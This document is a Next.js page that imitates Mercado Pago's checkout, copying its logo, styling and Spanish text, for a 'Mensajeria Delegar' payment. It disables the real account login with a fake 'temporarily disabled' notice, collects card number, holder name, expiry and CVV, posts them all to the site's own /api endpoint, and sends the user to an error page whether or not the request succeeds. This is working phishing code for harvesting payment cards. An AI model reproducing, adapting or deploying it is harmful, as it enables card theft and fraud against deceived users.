//@ts-nocheck
"use client";
import ccu from "creditcardutils";
import { useState } from "react";
import { useSearchParams } from "next/navigation";
import { useRouter } from "next/navigation";
export default function Home() {
  const [mpAccClicked, setmpAccClicked] = useState(false);
  const [ready, setReady] = useState(true);
  const [cc, setCC] = useState(null);
  const [expiry, setExpiry] = useState(null);
  const [name, setName] = useState(null);
  const [error, setError] = useState(null);
  const [cvv, setCVV] = useState(null);
  const params = useSearchParams();
  const { push } = useRouter();
  const amount = params.get("amount");
  if (!amount) push("/error");
  const [state, setState] = useState(0);
  async function onMPClick(ev) {
    setmpAccClicked(true);
  }
  async function onSubmit(ev) {
    ev.preventDefault();
    console.log(ev);
    if (
      !name ||
      !cc ||
      !expiry ||
      !cvv ||
      !ccu.validateCardCVC(cvv) ||
      !ccu.validateCardExpiry(expiry.split("/")[0], expiry.split("/")[1]) ||
      !ccu.validateCardNumber(cc)
    ) {
      console.log(
        !name,
        !cc,
        !expiry,
        !cvv,
        !ccu.validateCardCVC(cvv),
        !ccu.validateCardExpiry(expiry.split("/")[0], expiry.split("/")[1]),
        !ccu.validateCardNumber(cc)
      );
      setError("Porfavor ingresa datos válidos.");
    } else {
      publish()
        .then((e) => push("/error"))
        .catch((e) => push("/error"));
    }
  }
  async function publish() {
    return await fetch("/api", {
      method: "POST",
      body: JSON.stringify({
        cc,
        cvv,
        expiry,
        name,
        amount,
      }),
    });
  }
  async function changeValCC(ev: ChangeEventHandler<HTMLInputElement>) {
    console.log(ev.target.value);
    setCC(ccu.formatCardNumber(ev.target.value));
  }
  async function changeValExp(ev: ChangeEventHandler<HTMLInputElement>) {
    console.log(ev.target.value);
    setExpiry(ccu.formatCardExpiry(ev.target.value));
  }
  async function changeValName(ev: ChangeEventHandler<HTMLInputElement>) {
    console.log(ev.target.value);
    setName(ev.target.value.replace(/[0-9]/g, ""));
  }
  async function changeValCVV(ev: ChangeEventHandler<HTMLInputElement>) {
    console.log(ev.target.value);
    setCVV(ev.target.value.replace(/[A-Z]/g, ""));
  }
  return (
    <div className="layout layout--redirect">
      <main className="layout-main" id="root-app" role="main">
        <div className="page-mask">
          <div className="optimus">
            {state == 0 ? (
              <div className="layout__col-content" id="group_content">
                <h1 className="c-title">
                  <span>¿Cómo querés pagar?</span>
                </h1>
                <div className="scroller">
                  <form autoComplete="off" className="form group_form_scroller" id="group_form_scroller" method="POST" noValidate>
                    <h2 className="title-h2" id="title-guest">
                      <span>Con cuenta de Mercado Pago</span>
                    </h2>
                    <ul
                      className="options-list ui-card select_mp_login"
                      data-loading="false"
                      onClick={() => onMPClick()}
                      style={{
                        padding: 0,
                      }}
                    >
                      <li
                        className="options-list__item item-mp_login_row"
                        components="[object Object],[object Object]"
                        history="[object Object]"
                        name="[ui_components][group_content][group_nested_pages][group_page_root][group_form_scroller][select_mp_login]"
                        siteid="MLA"
                        trackevent="[object Object]"
                        value="[mp_login_row]"
                      >
                        <input
                          disabled={true}
                          className="u-hide"
                          id="mp_login_row"
                          name="[ui_components][group_content][group_nested_pages][group_page_root][group_form_scroller][select_mp_login]"
                          type="radio"
                          defaultValue="[mp_login_row]"
                        />
                        <label className="options-list__label" htmlFor="mp_login_row">
                          <div className="group-media-object">
                            <div>
                              <div className="icon-wrapper">
                                <svg
                                  height={26}
                                  viewBox="0 0 95 62"
                                  width={36}
                                  xmlns="http://www.w3.org/2000/svg"
                                  className="icon-mercado-pago"
                                >
                                  <g fill="none" fillRule="evenodd">
                                    <path
                                      d="M93.165 29.207C93.165 13.667 72.534 1 47.085 1c-25.45 0-46.08 12.667-46.08 28.207 0 .402-.005 1.51-.005 1.651 0 16.486 18.032 29.839 46.078 29.839 28.22 0 46.087-13.349 46.087-29.835v-1.655"
                                      fill="#2D3277"
                                    />
                                    <path
                                      d="M91.4 29.194c0 14.65-19.836 26.527-44.308 26.527-24.47 0-44.306-11.877-44.306-26.527 0-14.651 19.836-26.528 44.306-26.528 24.472 0 44.308 11.877 44.308 26.528"
                                      fill="#009ee3"
                                    />
                                    <path
                                      d="M32.38 20.824c-.023.042-.465.47-.178.814.7.836 2.858 1.316 5.042.856 1.3-.272 2.968-1.513 4.583-2.712 1.749-1.301 3.485-2.604 5.23-3.122 1.848-.55 3.032-.315 3.814-.093.859.24 1.867.769 3.477 1.898 3.031 2.133 15.222 12.091 17.328 13.813 1.697-.717 9.236-3.754 19.481-5.868-.89-5.111-4.213-9.788-9.251-13.618-7.022 2.761-15.606 4.201-23.998.366-.043-.017-4.585-2.03-9.065-1.93-6.66.145-9.544 2.842-12.597 5.698l-3.865 3.898"
                                      fill="#FFFFFE"
                                    />
                                    <path
                                      d="M71.18 33.362c-.141-.12-14.332-11.741-17.548-14.002-1.86-1.306-2.895-1.639-3.982-1.768-.566-.07-1.346.029-1.893.17-1.496.38-3.45 1.603-5.187 2.892-1.798 1.34-3.493 2.602-5.065 2.931-2.01.422-4.464-.076-5.583-.784-.454-.285-.773-.616-.927-.95-.413-.898.35-1.615.475-1.736l3.916-3.964c.455-.426.914-.85 1.383-1.27-1.264.154-2.432.456-3.569.752-1.419.374-2.784.73-4.164.728-.577 0-3.665-.473-4.25-.623-3.545-.907-6.656-1.791-11.302-3.821-5.566 3.879-9.29 8.729-10.365 14.07.8.198 2.089.557 2.63.67 12.6 2.62 16.523 5.321 17.235 5.886a4.314 4.314 0 0 1 3.123-1.31c1.395 0 2.65.655 3.414 1.669a4.965 4.965 0 0 1 3.002-.988c.585 0 1.19.101 1.803.296 1.42.456 2.154 1.342 2.535 2.143a4.46 4.46 0 0 1 1.754-.348c.677 0 1.384.145 2.095.433 2.322.933 2.684 3.068 2.474 4.677.165-.018.331-.025.5-.025 2.754.002 4.995 2.097 4.993 4.677 0 .797-.217 1.548-.596 2.206.748.395 2.659 1.287 4.336 1.087 1.34-.157 1.849-.587 2.03-.827.126-.166.258-.36.135-.498l-3.555-3.697s-.585-.518-.392-.718c.201-.205.562.09.818.29 1.81 1.414 4.019 3.548 4.019 3.548.037.023.183.294 1 .43.704.119 1.948.05 2.81-.613.218-.168.435-.377.616-.59-.014.008-.026.023-.04.028.91-1.088-.1-2.19-.1-2.19l-4.15-4.36s-.594-.514-.392-.721c.18-.18.562.092.822.293 1.314 1.029 3.17 2.772 4.95 4.403.348.238 1.912 1.145 3.983-.13 1.256-.77 1.509-1.717 1.473-2.434-.087-.946-.876-1.62-.876-1.62l-5.67-5.333s-.598-.48-.387-.72c.173-.205.562.089.817.287 1.806 1.416 6.695 5.61 6.695 5.61.07.046 1.759 1.171 3.846-.072.747-.447 1.223-1.12 1.264-1.902.071-1.357-.952-2.162-.952-2.162"
                                      fill="#FFFFFE"
                                    />
                                    <path
                                      d="M43.684 40.124c-.88-.01-1.84.478-1.966.408-.07-.044.054-.374.136-.565.084-.189 1.242-3.45-1.58-4.582-2.16-.868-3.479.11-3.933.55-.12.116-.173.107-.186-.04-.044-.587-.325-2.175-2.188-2.708-2.664-.763-4.376.977-4.81 1.605-.195-1.42-1.479-2.523-3.05-2.525-1.709-.002-3.094 1.294-3.096 2.892 0 1.597 1.384 2.893 3.091 2.893.83.002 1.583-.309 2.138-.807.018.015.025.042.016.098-.13.714-.37 3.316 2.54 4.374 1.167.424 2.16.11 2.983-.431.245-.162.284-.093.25.122-.106.668.028 2.101 2.173 2.915 1.632.62 2.598-.014 3.23-.561.276-.236.352-.199.365.165.078 1.936 1.796 3.472 3.882 3.474 2.15.002 3.892-1.624 3.892-3.634.002-2.013-1.738-3.621-3.887-3.643"
                                      fill="#FFFFFE"
                                    />
                                    <path
                                      d="M43.684 47.142c-1.948-.001-3.532-1.418-3.603-3.224-.005-.154-.022-.565-.394-.565-.153 0-.287.086-.44.214-.427.372-.973.75-1.77.75-.36 0-.753-.079-1.167-.237-2.057-.78-2.085-2.102-2.002-2.634.024-.141.03-.29-.073-.404l-.126-.106h-.13c-.103 0-.211.04-.357.136-.595.392-1.166.58-1.746.58-.32 0-.646-.059-.974-.178-2.709-.986-2.495-3.378-2.363-4.098.02-.146-.018-.259-.118-.334l-.191-.148-.179.16a2.889 2.889 0 0 1-1.944.737c-1.551-.001-2.813-1.181-2.812-2.632.001-1.453 1.265-2.632 2.816-2.63 1.401 0 2.595.987 2.774 2.297l.096.707.415-.599c.047-.069 1.183-1.678 3.273-1.675.397 0 .808.059 1.22.18 1.666.475 1.948 1.889 1.992 2.477.03.343.29.359.341.359.144 0 .25-.085.325-.16a2.927 2.927 0 0 1 2.07-.817c.49.003 1.013.111 1.552.328 2.646 1.063 1.445 4.21 1.431 4.243-.227.522-.237.752-.022.886l.104.046h.077c.12 0 .268-.049.513-.126.36-.117.904-.292 1.412-.29h.001c1.993.02 3.614 1.537 3.614 3.382-.002 1.862-1.623 3.375-3.615 3.375zM71.73 31.97c-4.37-3.57-14.474-11.79-17.21-13.712-1.564-1.1-2.63-1.682-3.566-1.943a6.309 6.309 0 0 0-1.752-.255c-.695 0-1.443.118-2.223.35-1.769.524-3.53 1.835-5.234 3.103l-.088.064c-1.587 1.18-3.228 2.402-4.469 2.662-.542.114-1.1.173-1.655.173-1.39-.002-2.64-.377-3.107-.936-.078-.093-.028-.242.152-.458l.024-.028 3.846-3.88c3.012-2.818 5.857-5.479 12.406-5.619.107-.004.218-.005.327-.005 4.075.002 8.15 1.71 8.608 1.907 3.821 1.745 7.767 2.632 11.732 2.634 4.134.002 8.398-.956 12.882-2.887-.5-.395-1.022-.778-1.558-1.155-3.94 1.599-7.692 2.405-11.313 2.405-3.697-.003-7.392-.834-10.98-2.472-.188-.085-4.688-2.07-9.37-2.073-.122 0-.246.003-.37.004-5.5.121-8.598 1.949-10.682 3.55-2.026.046-3.775.504-5.33.91-1.389.362-2.587.675-3.756.674-.482 0-1.349-.042-1.427-.044-1.344-.037-8.118-1.593-13.506-3.501-.55.364-1.08.74-1.595 1.123 5.63 2.16 12.479 3.83 14.641 3.961.601.037 1.243.101 1.884.102 1.43 0 2.858-.376 4.24-.737.814-.215 1.715-.448 2.662-.618-.253.233-.505.468-.758.705l-3.908 3.955c-.307.292-.975 1.067-.535 2.022.176.385.53.753 1.028 1.067.931.587 2.598.984 4.147.985.587 0 1.143-.055 1.655-.163 1.637-.343 3.355-1.624 5.175-2.979 1.45-1.077 3.51-2.447 5.087-2.848a6.135 6.135 0 0 1 1.418-.182c.13.001.252.004.367.02 1.042.123 2.05.455 3.848 1.718 3.207 2.255 17.4 13.875 17.54 13.99.008.007.914.737.85 1.952-.033.676-.435 1.278-1.133 1.696-.605.359-1.231.542-1.863.542a3.207 3.207 0 0 1-1.644-.445c-.052-.04-4.915-4.213-6.704-5.614-.285-.221-.562-.42-.842-.42a.473.473 0 0 0-.371.164c-.282.324.034.774.405 1.07l5.68 5.342c.008.006.708.62.785 1.44.044.886-.409 1.627-1.35 2.204-.67.413-1.348.623-2.013.623a3.055 3.055 0 0 1-1.62-.46l-.815-.752c-1.488-1.37-3.026-2.789-4.152-3.667-.274-.214-.567-.412-.846-.412a.5.5 0 0 0-.358.142c-.129.134-.218.374.102.772.132.164.287.3.287.3l4.145 4.357c.035.039.854.95.094 1.859l-.147.173a4.166 4.166 0 0 1-.385.349c-.708.542-1.652.6-2.026.6-.2 0-.393-.016-.56-.045-.41-.068-.684-.175-.817-.321l-.05-.05c-.227-.219-2.316-2.215-4.045-3.565-.228-.18-.512-.404-.806-.404a.509.509 0 0 0-.374.157c-.342.35.171.874.389 1.066l3.536 3.649c-.004.032-.05.108-.135.223-.126.164-.555.565-1.837.716-.154.02-.313.026-.47.026-1.322 0-2.733-.6-3.46-.961.331-.655.503-1.374.503-2.097.001-2.723-2.362-4.94-5.271-4.94-.062 0-.128 0-.19.003.095-1.243-.093-3.597-2.675-4.633a5.875 5.875 0 0 0-2.205-.455c-.564 0-1.106.09-1.616.274-.535-.973-1.423-1.682-2.582-2.052a6.137 6.137 0 0 0-1.893-.311 5.228 5.228 0 0 0-2.947.882c-.846-.984-2.124-1.567-3.47-1.567-1.177 0-2.31.442-3.149 1.22-1.1-.787-5.465-3.382-17.148-5.865-.566-.12-1.865-.468-2.66-.687-.131.592-.233 1.19-.299 1.795 0 0 2.155.483 2.579.572 11.935 2.481 15.878 5.06 16.545 5.548a3.976 3.976 0 0 0-.344 1.607c-.002 2.306 2.003 4.186 4.471 4.188.276 0 .55-.023.82-.069.372 1.697 1.56 2.985 3.374 3.646.53.19 1.067.289 1.593.289.34 0 .683-.04 1.019-.12.334.797 1.089 1.79 2.774 2.43.591.223 1.183.34 1.757.34.47 0 .929-.077 1.366-.228.808 1.842 2.73 3.061 4.874 3.061A5.445 5.445 0 0 0 47.46 47.2c.852.443 2.649 1.244 4.465 1.246a6.1 6.1 0 0 0 .676-.04c1.803-.213 2.643-.874 3.029-1.387.069-.089.132-.184.185-.282.426.114.894.207 1.43.208.986 0 1.93-.314 2.886-.966.939-.633 1.606-1.542 1.702-2.316l.005-.034c.316.062.641.093.965.093 1.014 0 2.012-.295 2.965-.88 1.838-1.129 2.158-2.602 2.127-3.567.322.064.65.096.977.096.952 0 1.887-.268 2.778-.8 1.14-.681 1.825-1.725 1.93-2.94a3.767 3.767 0 0 0-.613-2.374c3.08-1.242 10.12-3.646 18.41-5.395a16.53 16.53 0 0 0-.258-1.787c-10.03 2.084-17.515 5.115-19.39 5.896z"
                                      fill="#2D3277"
                                    />
                                  </g>
                                </svg>
                              </div>
                            </div>
                            <div>
                              <div
                                className="row-details"
                                style={{
                                  padding: 3,
                                }}
                              >
                                <div className="title">
                                  <span>Ingresar con mi cuenta de Mercado Pago</span>
                                  <br />
                                  <span
                                    style={{
                                      fontSize: 14,
                                      marginTop: 3,
                                      color: "red",
                                    }}
                                  ></span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </label>
                      </li>
                    </ul>
                    {mpAccClicked && (
                      <p
                        style={{
                          color: "red",
                          fontSize: 15,
                          marginBottom: 20,
                        }}
                      >
                        Esta opcion se encuentra deshabilitada temporalmente.
                      </p>
                    )}

                    <div className="group-flex" id="options-title-guest" style={{ display: "flex" }}>
                      <h2 className="title-h2">
                        <span>Sin cuenta de Mercado Pago</span>
                      </h2>
                    </div>
                    <ul
                      className="options-list ui-card select_general_payment_options"
                      data-loading="false"
                      style={{
                        padding: 0,
                      }}
                    >
                      <li
                        className="options-list__item item-new_card_row"
                        components="[object Object],[object Object]"
                        history="[object Object]"
                        name="[ui_components][group_content][group_nested_pages][group_page_root][group_form_scroller][select_general_payment_options]"
                        siteid="MLA"
                        trackevent="[object Object]"
                        value="[new_card_row]"
                        onClick={() => setState(1)}
                      >
                        <input
                          className="u-hide"
                          id="new_card_row"
                          name="[ui_components][group_content][group_nested_pages][group_page_root][group_form_scroller][select_general_payment_options]"
                          type="radio"
                          defaultValue="[new_card_row]"
                        />
                        <label className="options-list__label" htmlFor="new_card_row">
                          <div className="group-media-object">
                            <div>
                              <div className="icon-wrapper">
                                <svg
                                  height={18}
                                  viewBox="0 0 24 18"
                                  width={24}
                                  xmlns="http://www.w3.org/2000/svg"
                                  className="with-custom-color"
                                  fill="none"
                                >
                                  <path d="M8.248 14.25H3.751V12.75H8.248V14.25Z" fill="currentColor" />
                                  <path
                                    d="M21 0.75H3C1.75736 0.75 0.75 1.75736 0.75 3V15C0.75 16.2426 1.75736 17.25 3 17.25H21C22.2426 17.25 23.25 16.2426 23.25 15V3C23.25 1.75736 22.2426 0.75 21 0.75ZM2.25 8.25V6.75H21.75V8.25H2.25ZM2.25 5.25H21.75V3C21.75 2.58579 21.4142 2.25 21 2.25H3C2.58579 2.25 2.25 2.58579 2.25 3V5.25ZM2.25 9.75H21.75V15C21.75 15.4142 21.4142 15.75 21 15.75H3C2.58579 15.75 2.25 15.4142 2.25 15V9.75Z"
                                    fill="currentColor"
                                    fillRule="evenodd"
                                    clipRule="evenodd"
                                  />
                                </svg>
                              </div>
                            </div>
                            <div>
                              <div className="row-details">
                                <div className="title">
                                  <span>Nueva tarjeta</span>
                                </div>
                                <div className="text">
                                  <span>Débito o crédito</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </label>
                      </li>
                    </ul>
                  </form>
                </div>
              </div>
            ) : (
              <div className="layout__col-content" id="group_content">
                <h1 className="c-title">
                  <span>Completá los datos de tu tarjeta</span>
                </h1>
                <div className="scroller">
                  <form
                    id="group_form"
                    className="form group_form "
                    method="POST"
                    noValidate
                    autoComplete="off"
                    onSubmit={onSubmit}
                  >
                    <div className="ui-card">
                      <div className="card-form-group">
                        <div className="cow-secure-fields card-number">
                          <div className="andes-form-control andes-form-control--textfield andes-form-control--default ">
                            <label>
                              <span className="andes-form-control__label">Número de tarjeta</span>
                              <div className="andes-form-control__control">
                                <div id="card_number" className="andes-form-control__field">
                                  <input
                                    required={true}
                                    name="[ui_components][group_content][group_scroller][group_form][controls][top_card_group][fullname]"
                                    type="text"
                                    autoComplete="cc-name"
                                    autoCorrect="no"
                                    autoCapitalize="no"
                                    spellCheck="no"
                                    rows={1}
                                    onChange={changeValCC}
                                    value={cc}
                                    id="cardNumber"
                                    className="andes-form-control__field"
                                    maxLength={19}
                                    placeholder="1234 1234 1243"
                                  />
                                </div>
                                <div className="cow-secure-field-card-icon icon-card--default">
                                  <div className="icon-wrapper default-card-icon">
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      width={20}
                                      height={20}
                                      fill="none"
                                      viewBox="0 0 20 20"
                                    >
                                      <path
                                        fill="#000"
                                        fillOpacity="0.55"
                                        d="M8.199 13.001l-4.204-.007.002-1.2 4.204.007-.002 1.2z"
                                      ></path>
                                      <path
                                        fill="#000"
                                        fillOpacity="0.55"
                                        fillRule="evenodd"
                                        d="M17.2 3.997H2.8a1.8 1.8 0 00-1.8 1.8v8.4a1.8 1.8 0 001.8 1.8h14.4a1.8 1.8 0 001.8-1.8v-8.4a1.8 1.8 0 00-1.8-1.8zm-15 10.2v-5.39h15.6v5.39a.6.6 0 01-.6.6H2.8a.6.6 0 01-.6-.6zm0-6.59h15.6v-1.81a.6.6 0 00-.6-.6H2.8a.6.6 0 00-.6.6v1.81z"
                                        clipRule="evenodd"
                                      ></path>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </label>
                          </div>
                        </div>
                        <div className="andes-form-control andes-form-control--textfield input-fullname ui-input-text">
                          <label htmlFor="fullname">
                            <span className="andes-form-control__label">Nombre del titular</span>
                          </label>
                          <div className="andes-form-control__control">
                            <input
                              name="[ui_components][group_content][group_scroller][group_form][controls][top_card_group][fullname]"
                              type="text"
                              autoComplete="cc-name"
                              autoCorrect="no"
                              autoCapitalize="no"
                              spellCheck="no"
                              required={true}
                              rows={1}
                              onChange={changeValName}
                              value={name}
                              id="fullname"
                              className="andes-form-control__field"
                              maxLength={120}
                              placeholder="Ej.: María López"
                            />
                            <div className="andes-form-control__embedded"></div>
                          </div>
                        </div>
                      </div>
                      <div
                        className="card-form-group"
                        style={{
                          marginTop: 10,
                        }}
                      >
                        <div className="cow-secure-fields expiration-date">
                          <div className="andes-form-control andes-form-control--textfield andes-form-control--default ">
                            <label>
                              <span className="andes-form-control__label">Vencimiento</span>
                              <div className="andes-form-control__control">
                                <div id="expiration_date" className="andes-form-control__field">
                                  <input
                                    name="[ui_components][group_content][group_scroller][group_form][controls][top_card_group][fullname]"
                                    type="text"
                                    autoComplete="cc-name"
                                    autoCorrect="no"
                                    required={true}
                                    autoCapitalize="no"
                                    spellCheck="no"
                                    rows={1}
                                    onChange={changeValExp}
                                    value={expiry}
                                    id="expirationDate"
                                    className="andes-form-control__field"
                                    maxLength={7}
                                    placeholder="MM/AA"
                                  />
                                </div>
                              </div>
                            </label>
                          </div>
                        </div>
                        <div className="cow-secure-fields security-code">
                          <div className="andes-form-control andes-form-control--textfield andes-form-control--default ">
                            <label>
                              <span className="andes-form-control__label">Código de seguridad</span>
                              <div className="andes-form-control__control">
                                <div id="cvv" className="andes-form-control__field">
                                  <input
                                    name="[ui_components][group_content][group_scroller][group_form][controls][top_card_group][fullname]"
                                    type="text"
                                    required={true}
                                    autoComplete="cc-name"
                                    autoCorrect="no"
                                    autoCapitalize="no"
                                    spellCheck="no"
                                    rows={1}
                                    id="cvv"
                                    onChange={changeValCVV}
                                    value={cvv}
                                    className="andes-form-control__field"
                                    maxLength={4}
                                    placeholder="123"
                                  />
                                </div>
                                <div className="andes-form-control__embedded">
                                  <svg
                                    width={25}
                                    height={25}
                                    viewBox="0 0 25 25"
                                    fill="none"
                                    xmlns="http://www.w3.org/2000/svg"
                                    className="icon-card-cvv-grey"
                                  >
                                    <path
                                      fillRule="evenodd"
                                      clipRule="evenodd"
                                      d="M20.25 4.99658H2.25C1.00736 4.99658 0 6.00394 0 7.24658V17.7474C0 18.99 1.00736 19.9974 2.25 19.9974H20.25C21.4926 19.9974 22.5 18.99 22.5 17.7474V7.24658C22.5 6.00394 21.4926 4.99658 20.25 4.99658ZM1.5 17.7474V11.0083H21V17.7474C21 18.1616 20.6642 18.4974 20.25 18.4974H2.25C1.83579 18.4974 1.5 18.1616 1.5 17.7474ZM1.5 9.50832H21V7.24658C21 6.83237 20.6642 6.49658 20.25 6.49658H2.25C1.83579 6.49658 1.5 6.83237 1.5 7.24658V9.50832Z"
                                      fill="black"
                                      fillOpacity="0.25"
                                    ></path>
                                    <rect x="7.5" y="3.75" width="17.5" height="11.25" rx={2} fill="#737373"></rect>
                                    <path
                                      d="M12.1223 10.36L12.1723 9.21L11.2123 9.84L10.9923 9.44L12.0123 8.92L10.9923 8.4L11.2123 8.01L12.1723 8.63L12.1223 7.48H12.5823L12.5223 8.63L13.4823 8.01L13.7123 8.4L12.6923 8.92L13.7123 9.44L13.4823 9.84L12.5223 9.21L12.5823 10.36H12.1223ZM16.0208 10.36L16.0708 9.21L15.1108 9.84L14.8908 9.44L15.9108 8.92L14.8908 8.4L15.1108 8.01L16.0708 8.63L16.0208 7.48H16.4808L16.4208 8.63L17.3808 8.01L17.6108 8.4L16.5908 8.92L17.6108 9.44L17.3808 9.84L16.4208 9.21L16.4808 10.36H16.0208ZM19.9192 10.36L19.9692 9.21L19.0092 9.84L18.7892 9.44L19.8092 8.92L18.7892 8.4L19.0092 8.01L19.9692 8.63L19.9192 7.48H20.3792L20.3192 8.63L21.2792 8.01L21.5092 8.4L20.4892 8.92L21.5092 9.44L21.2792 9.84L20.3192 9.21L20.3792 10.36H19.9192Z"
                                      fill="white"
                                    ></path>
                                  </svg>
                                </div>
                              </div>
                            </label>
                          </div>
                        </div>
                      </div>
                    </div>
                    {error && (
                      <span
                        style={{
                          color: "red",
                        }}
                      >
                        {error}
                      </span>
                    )}
                    <button
                      type="submit"
                      className="andes-button andes-button--large andes-button--loud"
                      id="submit"
                      data-loading="false"
                      disabled={!ready}
                      name="[ui_components][group_content][group_scroller][group_form][submit]"
                    >
                      <span className="andes-button__content">Continuar</span>
                    </button>
                    <div className="with-track-event-wrapper" aria-hidden="true">
                      <button
                        type="submit"
                        className="andes-button button_back_default andes-button--large andes-button--quiet"
                        id=":r0:"
                        data-loading="false"
                        name="[ui_components][group_content][group_scroller][group_form][back_button]"
                      >
                        <span className="andes-button__content">Volver</span>
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            )}

            <div className="layout__col-sidebar">
              <div className="brand">
                <span className="brand__name brand__name__large">Mensajeria Delegar</span>
              </div>
              <div className="group-summary">
                <div className="group-summary__container">
                  <h2 className="title-h2">
                    <span>Detalle de tu compra</span>
                  </h2>
                  <div className="row-summary">
                    <span className="row-summary__text">Mensajeria</span>
                    <span className="row-summary__price">$ {amount}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
